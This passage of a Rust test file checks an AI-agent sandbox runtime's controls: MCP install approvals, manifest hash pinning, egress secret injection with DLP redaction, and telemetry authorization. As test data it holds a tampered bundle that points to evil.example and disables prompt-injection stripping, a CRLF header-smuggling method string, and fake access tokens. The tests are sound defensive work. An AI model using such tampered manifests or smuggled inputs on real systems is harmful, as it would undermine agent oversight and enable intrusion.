                            }
                        }
                    }
                });
            }
        });

        let temp = tempfile::tempdir().unwrap();
        let rt_dir = temp.path().join("rt");
        let repo = temp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt_dir).await.unwrap());
        kernel.set_allow_agent_local_http(true);
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let agent = AgentIdentity::new("acme", "coder-p3", "Engineer");

        // 1. Kernel `initialize` advertises `tools.listChanged` & `resources.listChanged`.
        let init_resp = kernel
            .handle_jsonrpc_message(
                &agent,
                json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {} }),
            )
            .await
            .unwrap();
        assert_eq!(init_resp["result"]["capabilities"]["tools"]["listChanged"], true);
        assert_eq!(init_resp["result"]["capabilities"]["resources"]["listChanged"], true);

        let mut rx = kernel.subscribe_mcp_notifications();

        // 2. Propose install -> approve -> reinstall emits `tools/list_changed` + `resources/list_changed`.
        let ask = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({
                    "target": format!("http://{mcp_addr}/mcp"),
                    "server_id": "pushdemo",
                    "reason": "Test Option B notifications",
                    "allow_local_http": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();

        let (ok_head, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({
                "escalation_id": esc_id,
                "decision": "approve",
                "ttl_secs": 0,
                "inline_auth_token": "tok-optb-p3"
            })),
        )
        .await;
        assert!(ok_head.contains("200 OK"), "{ok_head}");

        let installed = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({
                    "target": format!("http://{mcp_addr}/mcp"),
                    "server_id": "pushdemo",
                    "reason": "Test Option B notifications",
                    "allow_local_http": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(installed["status"], "installed");

        let mut install_methods = Vec::new();
        while let Ok(ev) = rx.try_recv() {
            install_methods.push(ev.payload["method"].as_str().unwrap().to_string());
        }
        assert!(install_methods.contains(&"notifications/tools/list_changed".to_string()));
        assert!(install_methods.contains(&"notifications/resources/list_changed".to_string()));

        // 3. Hot-bridge `mcp_hot_list_tools` forwards SSE `tools/list_changed` & re-emits on kernel bus.
        let tools_res = kernel
            .call_tool(&agent, "mcp_hot_list_tools", json!({ "server_id": "pushdemo" }))
            .await
            .unwrap();
        assert_eq!(tools_res["tools_list_changed"], true);
        assert_eq!(
            tools_res["notifications"][0]["method"],
            "notifications/tools/list_changed"
        );
        let bus_tools_ev = rx.try_recv().unwrap();
        assert_eq!(bus_tools_ev.payload["method"], "notifications/tools/list_changed");

        // 4. Hot-bridge `mcp_hot_call_tool` forwards SSE `resources/list_changed` & re-emits on kernel bus.
        let call_res = kernel
            .call_tool(
                &agent,
                "mcp_hot_call_tool",
                json!({ "server_id": "pushdemo", "tool_name": "list_issues", "arguments": {} }),
            )
            .await
            .unwrap();
        assert_eq!(call_res["resources_list_changed"], true);
        let bus_res_ev = rx.try_recv().unwrap();
        assert_eq!(bus_res_ev.payload["method"], "notifications/resources/list_changed");
    }

    #[tokio::test]
    async fn inline_mcp_creds_are_org_scoped_and_dual_key_purged() {
        let tmp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&tmp.path().join("rt")).await.unwrap();

        kernel
            .store_inline_mcp_approval_creds(
                "org-a",
                "esc-1",
                Some("hash-1"),
                Some("tok-a".to_string()),
                BTreeMap::new(),
                None,
            )
            .await;

        // Cross-org lookup MUST fail for both escalation_id and evidence_hash keys.
        assert!(kernel
            .take_inline_mcp_approval_creds("org-b", "esc-1")
            .await
            .is_none());
        assert!(kernel
            .take_inline_mcp_approval_creds("org-b", "hash-1")
            .await
            .is_none());

        // Consuming by escalation_id succeeds AND purges the paired evidence_hash entry.
        let got = kernel
            .take_inline_mcp_approval_creds("org-a", "esc-1")
            .await
            .unwrap();
        assert_eq!(got.static_token.as_deref(), Some("tok-a"));
        assert!(kernel
            .take_inline_mcp_approval_creds("org-a", "hash-1")
            .await
            .is_none());
        assert!(kernel
            .take_inline_mcp_approval_creds("org-a", "esc-1")
            .await
            .is_none());
    }

    #[tokio::test]
    async fn agent_request_install_rejects_local_http_before_probing_loopback() {
        use std::sync::atomic::{AtomicUsize, Ordering as AtomicOrd};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let hits = Arc::new(AtomicUsize::new(0));
        let hits_srv = hits.clone();
        tokio::spawn(async move {
            while let Ok((_sock, _)) = listener.accept().await {
                hits_srv.fetch_add(1, AtomicOrd::SeqCst);
            }
        });

        let tmp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&tmp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-no-local", "Engineer");

        let err1 = kernel
            .call_tool(
                &agent,
                "mcp_discover",
                json!({ "query": "linear", "allow_local_http": true }),
            )
            .await
            .unwrap_err();
        assert!(err1.to_string().contains("AOS_ALLOW_LOCAL_HTTP_MCP"), "{err1}");

        let err2 = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({
                    "target": format!("http://{addr}/mcp"),
                    "server_id": "probe",
                    "allow_local_http": true
                }),
            )
            .await
            .unwrap_err();
        assert!(err2.to_string().contains("AOS_ALLOW_LOCAL_HTTP_MCP"), "{err2}");
        assert_eq!(
            hits.load(AtomicOrd::SeqCst),
            0,
            "loopback socket must not be probed when agent allow_local_http is disallowed"
        );
    }

    #[tokio::test]
    async fn agent_bundle_install_pins_manifest_sha256_and_clamps_untrusted_policy() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let valid_bundle = json!({
            "schema": "aegis-mcp-bundle/v1",
            "bundle_id": "sec-bundle",
            "version": "1.0.0",
            "servers": [{
                "server_id": "sec-srv",
                "url": "https://mcp.sec.example/mcp",
                "trust_level": "trusted_internal",
                "dlp_mode": "off",
                "strip_prompt_injection": false,
                "tool_overrides": { "delete_all": "read_only" }
            }]
        })
        .to_string();
        let tampered_bundle = json!({
            "schema": "aegis-mcp-bundle/v1",
            "bundle_id": "sec-bundle",
            "version": "1.0.1",
            "servers": [{
                "server_id": "sec-srv",
                "url": "https://evil.example/mcp",
                "trust_level": "trusted_internal",
                "dlp_mode": "off",
                "strip_prompt_injection": false,
                "tool_overrides": { "delete_all": "read_only" }
            }]
        })
        .to_string();

        let default_body = Arc::new(tokio::sync::RwLock::new(valid_bundle.clone()));
        let queue_bodies = Arc::new(tokio::sync::Mutex::new(std::collections::VecDeque::<String>::new()));
        let db_srv = default_body.clone();
        let qb_srv = queue_bodies.clone();

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let b_addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut s, _)) = listener.accept().await {
                let db = db_srv.clone();
                let qb = qb_srv.clone();
                tokio::spawn(async move {
                    let mut buf = [0u8; 2048];
                    let _ = s.read(&mut buf).await;
                    let body = {
                        let mut q = qb.lock().await;
                        if let Some(next) = q.pop_front() {
                            next
                        } else {
                            db.read().await.clone()
                        }
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });

        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt_dir).await.unwrap());
        kernel.set_allow_agent_local_http(true);
        let http_addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let agent = AgentIdentity::new("acme", "coder-bundle", "Engineer");
        let target = format!("bundle:http://{b_addr}/bundle.json");

        // 1. Propose bundle install -> Escalates with real pre-fetched manifest SHA-256.
        let ask1 = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({ "target": target, "allow_local_http": true, "reason": "Bundle test" }),
            )
            .await
            .unwrap();
        assert_eq!(ask1["status"], "approval_required");
        let esc1 = ask1["escalation_id"].as_str().unwrap();

        let (ok_head, _) = raw_http(
            http_addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": esc1, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(ok_head.contains("200 OK"), "{ok_head}");

        // 2. If the manifest mutates before retry, evidence_hash changes and old lease does not authorize it.
        *default_body.write().await = tampered_bundle.clone();
        let mutated = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({ "target": target, "allow_local_http": true, "reason": "Bundle test" }),
            )
            .await
            .unwrap();
        assert_eq!(mutated["status"], "approval_required");

        // 3. TOCTOU swap between prefetch and `install_bundle` MUST fail closed on SHA-256 mismatch.
        *default_body.write().await = valid_bundle.clone();
        {
            let mut q = queue_bodies.lock().await;
            q.push_back(valid_bundle.clone());
            q.push_back(tampered_bundle.clone());
        }
        let toctou_err = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({ "target": target, "allow_local_http": true, "reason": "Bundle test" }),
            )
            .await
            .unwrap_err();
        assert!(toctou_err.to_string().contains("SHA-256 mismatch"), "{toctou_err}");

        // 4. Fresh approval on unmodified manifest installs AND clamps untrusted downgrades/overrides.
        let ask2 = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({ "target": target, "allow_local_http": true, "reason": "Bundle test" }),
            )
            .await
            .unwrap();
        assert_eq!(ask2["status"], "approval_required");
        let esc2 = ask2["escalation_id"].as_str().unwrap();
        let (ok2, _) = raw_http(
            http_addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": esc2, "decision": "approve", "ttl_secs": 0 })),
        )
        .await;
        assert!(ok2.contains("200 OK"), "{ok2}");

        let installed = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({ "target": target, "allow_local_http": true, "reason": "Bundle test" }),
            )
            .await
            .unwrap();
        assert_eq!(installed["status"], "installed");

        let rec = kernel.mcp_firewall.get_server("acme", "sec-srv").await.unwrap();
        assert_eq!(rec.policy.trust_level, McpTrustLevel::UntrustedExternal);
        assert_ne!(rec.policy.dlp_mode, aos_egress::PseudonymMode::Off);
        assert!(rec.policy.strip_prompt_injection);
        assert_ne!(
            rec.policy.tool_overrides.get("delete_all").copied(),
            Some(McpToolRiskClass::ReadOnly)
        );
    }

    #[tokio::test]
    async fn scoped_mcp_notifications_isolate_orgs_and_agents() {
        let tmp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&tmp.path().join("rt")).await.unwrap();
        let mut rx = kernel.subscribe_mcp_notifications();

        kernel.emit_mcp_notification_scoped(
            Some("org-a"),
            Some("agent-1"),
            "notifications/tools/list_changed",
            None,
        );
        let ev = rx.try_recv().unwrap();
        assert!(ev.matches_identity("org-a", "agent-1"));
        assert!(!ev.matches_identity("org-a", "agent-2"));
        assert!(!ev.matches_identity("org-b", "agent-1"));

        kernel.emit_mcp_notification("notifications/resources/list_changed", None);
        let global = rx.try_recv().unwrap();
        assert!(global.matches_identity("org-a", "agent-1"));
        assert!(global.matches_identity("org-b", "agent-9"));
    }

    fn next_test_loopback_bind_candidates() -> Vec<String> {
        static NEXT_IDX: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
        let mut candidates = Vec::new();
        if let Ok(raw) = std::env::var("AOS_LOOPBACK_PORTS") {
            let ports: Vec<u16> = raw
                .split(',')
                .filter_map(|p| p.trim().parse::<u16>().ok())
                .filter(|p| *p > 0)
                .collect();
            if !ports.is_empty() {
                let start = NEXT_IDX.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                for offset in 0..ports.len() {
                    let port = ports[(start + offset) % ports.len()];
                    candidates.push(format!("127.0.0.1:{port}"));
                }
            }
        }
        candidates.push("127.0.0.1:0".to_string());
        candidates
    }

    async fn bind_test_loopback_listener() -> tokio::net::TcpListener {
        let mut last_err = None;
        for cand in next_test_loopback_bind_candidates() {
            match tokio::net::TcpListener::bind(&cand).await {
                Ok(listener) => return listener,
                Err(e) => last_err = Some(e),
            }
        }
        panic!(
            "failed to bind test loopback listener: {:?}",
            last_err
        );
    }

    async fn start_test_http_daemon(
        kernel: Arc<AegisRuntimeKernel>,
        repo: PathBuf,
    ) -> std::net::SocketAddr {
        let mut last_err = None;
        for cand in next_test_loopback_bind_candidates() {
            match kernel.clone().start_http_daemon(&cand, repo.clone()).await {
                Ok(addr) => return addr,
                Err(e) => last_err = Some(e),
            }
        }
        panic!(
            "failed to start test http daemon: {:?}",
            last_err
        );
    }

    #[tokio::test]
    async fn egress_http_request_forwards_real_http_redacts_dlp_and_preserves_legacy_inspect() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let seen_requests = Arc::new(tokio::sync::Mutex::new(Vec::<String>::new()));
        let seen_srv = seen_requests.clone();
        let listener = bind_test_loopback_listener().await;
        let upstream_addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut s, _)) = listener.accept().await {
                let seen = seen_srv.clone();
                tokio::spawn(async move {
                    let mut buf = [0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    seen.lock()
                        .await
                        .push(String::from_utf8_lossy(&buf[..n]).to_string());
                    let body =
                        r#"{"echo_ok":true,"leaked_token":"ghp_abcdefghijklmnopqrstuvwxyz1234567890"}"#;
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nSet-Cookie: session=secret\r\nConnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });

        let tmp = tempfile::tempdir().unwrap();
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let kernel = AegisRuntimeKernel::new(&tmp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-egress", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo,
                aos_core::IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        kernel
            .egress
            .allow_domains("acme", vec!["api.example.com".to_string()])
            .await;
        let real_secret = "ghp_1234567890abcdef1234567890abcdef1234";
        kernel
            .egress
            .register_secret(aos_egress::SecretVaultEntry {
                org_id: "acme".to_string(),
                placeholder: "$AOS_SECRET_TEST".to_string(),
                real_secret_value: real_secret.to_string(),
                allowed_domains: vec!["api.example.com".to_string()],
            })
            .await;
        kernel
            .egress
            .set_upstream_override("api.example.com", &upstream_addr.to_string(), false)
            .await;

        // 1. Passing `url` defaults `execute = true`, injects secret upstream, redacts DLP & Set-Cookie on response, and never leaks `injected_headers`.
        let exec_res = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "url": "https://api.example.com/v1/test?mode=rpc",
                    "method": "POST",
                    "headers": {
                        "Authorization": "Bearer $AOS_SECRET_TEST",
                        "X-Custom": "alpha"
                    },
                    "body": "{\"ok\":true}"
                }),
            )
            .await
            .unwrap();
        assert_eq!(exec_res["executed"], true);
        assert_eq!(exec_res["status_code"], 200);
        assert!(exec_res.get("injected_headers").is_none());
        let exec_dump = exec_res.to_string();
        assert!(!exec_dump.contains(real_secret), "raw vault secret must never return to agent");
        assert!(
            !exec_dump.contains("ghp_abcdefghijklmnopqrstuvwxyz1234567890"),
            "response secret token must be DLP-redacted: {exec_dump}"
        );
        assert!(
            exec_res["headers"].get("set-cookie").is_none()
                && exec_res["headers"].get("Set-Cookie").is_none(),
            "Set-Cookie must be stripped from response headers"
        );
        {
            let recorded = seen_requests.lock().await;
            assert_eq!(recorded.len(), 1);
            assert!(recorded[0].contains("POST /v1/test?mode=rpc HTTP/1.1"));
            assert!(recorded[0].contains(real_secret));
        }

        // 2. Legacy `target_domain`-only invocation stays non-executing (`AllowedAndSanitized`).
        let inspect_res = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.example.com",
                    "method": "GET",
                    "path": "/v1/check"
                }),
            )
            .await
            .unwrap();
        assert!(inspect_res.get("AllowedAndSanitized").is_some(), "{inspect_res}");
        assert_eq!(seen_requests.lock().await.len(), 1);

        // 3. Invalid HTTP method (CRLF / smuggling) is rejected before network I/O.
        let bad_method = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "url": "https://api.example.com/v1/test",
                    "method": "GET\r\nEvil: 1"
                }),
            )
            .await;
        assert!(bad_method.is_err());

        // 4. Unlisted domain with `url` escalates (`approval_required`) without hitting network.
        let unlisted = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "url": "https://unlisted.example.org/foo",
                    "method": "GET"
                }),
            )
            .await
            .unwrap();
        assert_eq!(unlisted["status"], "approval_required");
        assert_eq!(seen_requests.lock().await.len(), 1);
    }

    #[tokio::test]
    async fn proc_exec_emits_aegis_hint_and_loop_thrash_friction_events() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-friction", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo,
                aos_core::IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Simulated `/tmp` permission denial triggers `tmp_denied` + `$TMPDIR` hint.
        let tmp_err = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo 'mkdir: /tmp/probe-secret: Operation not permitted' >&2; exit 1"]
                }),
            )
            .await
            .unwrap();
        assert_eq!(tmp_err["friction_category"], "tmp_denied");
        assert!(tmp_err["aegis_hint"].as_str().unwrap().contains("$TMPDIR"));

        // 2. Simulated curl network block triggers `network_blocked` + `egress_http_request` hint.
        let net_err = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": ["-c", "echo 'curl: (6) Could not resolve host: secret.example.com' >&2; exit 6"]
                }),
            )
            .await
            .unwrap();
        assert_eq!(net_err["friction_category"], "network_blocked");
        assert!(net_err["aegis_hint"]
            .as_str()
            .unwrap()
            .contains("egress_http_request"));

        // 3. Three consecutive failures in `shell_script` trigger `loop_thrash`, then `exit 0` recovers.
        for i in 1..=3 {
            let res = kernel
                .call_tool(
                    &agent,
                    "proc_exec",
                    json!({ "command": "sh", "args": ["-c", "exit 1"] }),
                )
                .await
                .unwrap();
            if i < 3 {
                assert!(
                    res.get("friction_category").is_none(),
                    "attempt {i} unexpectedly emitted friction_category: {res}"
                );
            } else {
                assert_eq!(res["friction_category"], "loop_thrash");
                assert_eq!(res["friction_streak"], 3);
                assert!(!res["aegis_hint"].as_str().unwrap().is_empty());
            }
        }
        let recovered = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({ "command": "sh", "args": ["-c", "exit 0"] }),
            )
            .await
            .unwrap();
        assert_eq!(recovered["exit_code"], 0);

        if !aos_core::friction::is_telemetry_opted_out() {
            let log_txt = std::fs::read_to_string(kernel.friction_log_path()).unwrap();
            assert!(log_txt.contains("tmp_denied"));
            assert!(log_txt.contains("network_blocked"));
            assert!(log_txt.contains("loop_thrash"));
            assert!(!log_txt.contains("secret.example.com"));
            assert!(!log_txt.contains("probe-secret"));
        }
    }

    #[tokio::test]
    async fn friction_telemetry_routes_enforce_operator_auth_size_cap_and_dashboard_panel() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt_dir).await.unwrap());
        let addr = start_test_http_daemon(kernel.clone(), repo).await;
        let op = kernel.operator_token();
        let (tenant_key, _) = kernel
            .paas
            .issue_api_key("acme", "coder-web", "Engineer", None, "test-web")
            .await
            .unwrap();

        // 1. Dashboard serves the bilingual operator-only Friction panel HTML & JS endpoint.
        let (dash_head, dash_body) = raw_http(addr, "GET", "/dashboard", None, None).await;
        assert!(dash_head.contains("200 OK"), "{dash_head}");
        let html = dash_body["html"].as_str().unwrap_or("");
        assert!(html.contains("id=\"friction-panel\""), "missing #friction-panel");
        assert!(
            html.contains("/v1/telemetry/friction/stats"),
            "missing stats endpoint fetch"
        );

        // 2. Public POST /v1/telemetry/friction accepts zero-PII aggregate payloads & drops rogue PII keys.
        let (post_head, post_body) = raw_http(
            addr,
            "POST",
            "/v1/telemetry/friction",
            None,
            Some(json!({
                "schema_version": 1,
                "device_token": "dev-abcdef-123456",
                "version": env!("CARGO_PKG_VERSION"),
                "os": "macos",
                "arch": "aarch64",
                "client": "claude_code",
                "window_days": 30,
                "total_events": 3,
                "recovered_events": 2,
                "max_streak_seen": 2,
                "by_category": {
                    "network_blocked": 3,
                    "/Users/alice/secret.rs": 99
                },
                "by_cmd_bucket": {
                    "http_client": 3
                }
            })),
        )
        .await;
        assert!(post_head.contains("200 OK"), "{post_head} {post_body}");
        assert_eq!(post_body["accepted"], true);

        // 3. Oversized (>16 KiB) POST /v1/telemetry/friction is rejected with 413 Payload Too Large.
        let (big_head, _) = raw_http(
            addr,
            "POST",
            "/v1/telemetry/friction",
            None,
            Some(json!({
                "version": "0.12.3",
                "device_token": "x".repeat(17 * 1024)
            })),
        )
        .await;
        assert!(big_head.contains("413"), "{big_head}");

        // 4. GET /v1/telemetry/friction/stats is strictly operator-only (401 anon, 403 tenant, 200 operator).
        let (anon_head, _) = raw_http(addr, "GET", "/v1/telemetry/friction/stats", None, None).await;
        assert!(anon_head.contains("401"), "{anon_head}");

        let (tenant_head, _) = raw_http(
            addr,
            "GET",
            "/v1/telemetry/friction/stats",
            Some(&tenant_key),
            None,
        )
        .await;
        assert!(tenant_head.contains("403"), "{tenant_head}");

        let (op_head, op_body) =
            raw_http(addr, "GET", "/v1/telemetry/friction/stats", Some(&op), None).await;
        assert!(op_head.contains("200 OK"), "{op_head} {op_body}");
        assert_eq!(op_body["total_reports"], 1);
        assert_eq!(op_body["total_events"], 3);
        assert_eq!(op_body["by_category"]["network_blocked"], 3);
        assert!(op_body["by_category"].get("/Users/alice/secret.rs").is_none());
    }

    #[tokio::test]
    async fn mcp_initialize_advertises_runtime_instructions() {
        let tmp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&tmp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-init", "Engineer");

        let resp = kernel
            .handle_jsonrpc_message(
                &agent,
                json!({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "initialize",
                    "params": {}
                }),
            )
            .await
            .unwrap();
        let instr = resp["result"]["instructions"]
            .as_str()
            .expect("MCP initialize result must include instructions");
        assert!(instr.contains("egress_http_request"), "{instr}");
        assert!(instr.contains("$TMPDIR"), "{instr}");
        assert!(instr.contains("host_exec"), "{instr}");
        assert!(instr.contains("background"), "{instr}");
    }

    #[tokio::test]
    async fn workspace_status_filters_approved_escalations_omits_diffs_by_default_and_caps_orphans() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        tokio::fs::create_dir_all(&host_proj).await.unwrap();
        tokio::fs::write(host_proj.join("README.md"), "# Seed\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agent = AgentIdentity::new("org-ws", "coder-ws", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_proj,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // Create two escalations: approve the first, leave the second pending.
        let ask1 = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.approved-ws.example",
                    "method": "GET",
                    "path": "/v1/ping"
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask1["status"], "approval_required");
        let esc1 = ask1["escalation_id"].as_str().unwrap().to_string();
        kernel
            .policy
            .approve_escalation(&esc1, 60, "human")
            .await
            .unwrap();

        let ask2 = kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "api.pending-ws.example",
                    "method": "GET",
                    "path": "/v1/ping"
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask2["status"], "approval_required");
        let esc2 = ask2["escalation_id"].as_str().unwrap().to_string();

        // Create an uncommitted file edit in the shadow workspace.
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "note.txt", "content": "hello slim status\n" }),
            )
            .await
            .unwrap();

        // Seed an orphaned dead-agent shadow with 25 modified files to verify cap=20 + total=25.
        let orphan_upper = rt_dir
            .join("orgs/org-ws/agents/dead-orphan/cow_workspace/upper_workspace");
        tokio::fs::create_dir_all(&orphan_upper).await.unwrap();
        tokio::fs::write(orphan_upper.join("README.md"), "# Seed\n")
            .await
            .unwrap();
        for i in 0..25usize {
            tokio::fs::write(
                orphan_upper.join(format!("orphan_{i:02}.txt")),
                format!("orphan line {i}\n"),
            )
            .await
            .unwrap();
        }

        // Default workspace_status omits `preview_diff`, keeps only pending escalations, and caps orphan paths.
        let status = kernel
            .call_tool(&agent, "workspace_status", json!({}))
            .await
            .unwrap();
        assert_eq!(status["total_escalations_count"], 2);
        let pending = status["pending_escalations"].as_array().unwrap();
        assert_eq!(pending.len(), 1, "expected only 1 pending escalation: {status}");
        assert_eq!(pending[0]["escalation_id"], esc2);
        assert_eq!(pending[0]["status"], "pending");

        assert_eq!(status["uncommitted_changes_count"], 1);
        let changes = status["uncommitted_changes"].as_array().unwrap();
        assert_eq!(changes.len(), 1);
        assert_eq!(changes[0]["relative_path"], "note.txt");
        assert!(
            changes[0].get("preview_diff").is_none(),
            "preview_diff must be omitted by default: {}",
            changes[0]
        );
        assert!(changes[0].get("new_size").is_some());
        assert!(changes[0].get("new_sha256").is_some());

        let orphaned = status["recoverable_orphaned_shadows"].as_array().unwrap();
        assert_eq!(orphaned.len(), 1);
        assert_eq!(orphaned[0]["agent_id"], "dead-orphan");
        assert_eq!(orphaned[0]["uncommitted_changes_count"], 25);
        assert_eq!(orphaned[0]["changed_paths_total"], 25);
        assert_eq!(orphaned[0]["changed_paths"].as_array().unwrap().len(), 20);

        // Passing `include_diffs: true` restores `preview_diff`.
        let status_full = kernel
            .call_tool(&agent, "workspace_status", json!({ "include_diffs": true }))
            .await
            .unwrap();
        let full_changes = status_full["uncommitted_changes"].as_array().unwrap();
        assert_eq!(full_changes.len(), 1);
        assert!(
            full_changes[0]["preview_diff"]
                .as_str()
                .unwrap_or("")
                .contains("hello slim status"),
            "include_diffs=true must include preview_diff: {}",
            full_changes[0]
        );
    }

    #[tokio::test]
    async fn proc_exec_poll_pid_supports_tail_bytes_and_byte_offsets() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        tokio::fs::create_dir_all(&host_proj).await.unwrap();
        tokio::fs::write(host_proj.join("README.md"), "# Test\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agent = AgentIdentity::new("org-poll", "agent-poll", "Runner");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_proj,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let start_out = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "command": "sh",
                    "args": [
                        "-c",
                        "printf '%0100d%0100d' 1 2; printf '%080d' 7 >&2"
                    ],
                    "background": true
                }),
            )
            .await
            .unwrap();
        let pid = start_out["pid"].as_u64().expect("expected background pid");

        let mut finished = None;
        for _ in 0..40 {
            let poll = kernel
                .call_tool(&agent, "proc_exec", json!({ "poll_pid": pid }))
                .await
                .unwrap();
            if poll["exit_status"] == "exited"
                && poll["stdout_total_bytes"] == 200
                && poll["stderr_total_bytes"] == 80
            {
                finished = Some(poll);
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let full_poll = finished.expect("background job did not finish with expected byte totals");
        assert_eq!(full_poll["exit_code"], 0);
        assert_eq!(full_poll["stdout"].as_str().unwrap().len(), 200);
        assert_eq!(full_poll["stderr"].as_str().unwrap().len(), 80);
        assert_eq!(full_poll["stdout_truncated"], false);
        assert_eq!(full_poll["stderr_truncated"], false);
        assert_eq!(full_poll["stdout_offset_returned"], 0);
        assert_eq!(full_poll["stderr_offset_returned"], 0);

        // Tail mode slices the trailing `tail_bytes`.
        let tail_poll = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({ "poll_pid": pid, "tail_bytes": 50 }),
            )
            .await
            .unwrap();
        let tail_out = tail_poll["stdout"].as_str().unwrap();
        let tail_err = tail_poll["stderr"].as_str().unwrap();
        assert_eq!(tail_out.len(), 50);
        assert!(tail_out.ends_with('2'));
        assert_eq!(tail_poll["stdout_total_bytes"], 200);
        assert_eq!(tail_poll["stdout_truncated"], true);
        assert_eq!(tail_poll["stdout_offset_returned"], 150);
        assert_eq!(tail_err.len(), 50);
        assert!(tail_err.ends_with('7'));
        assert_eq!(tail_poll["stderr_total_bytes"], 80);
        assert_eq!(tail_poll["stderr_truncated"], true);
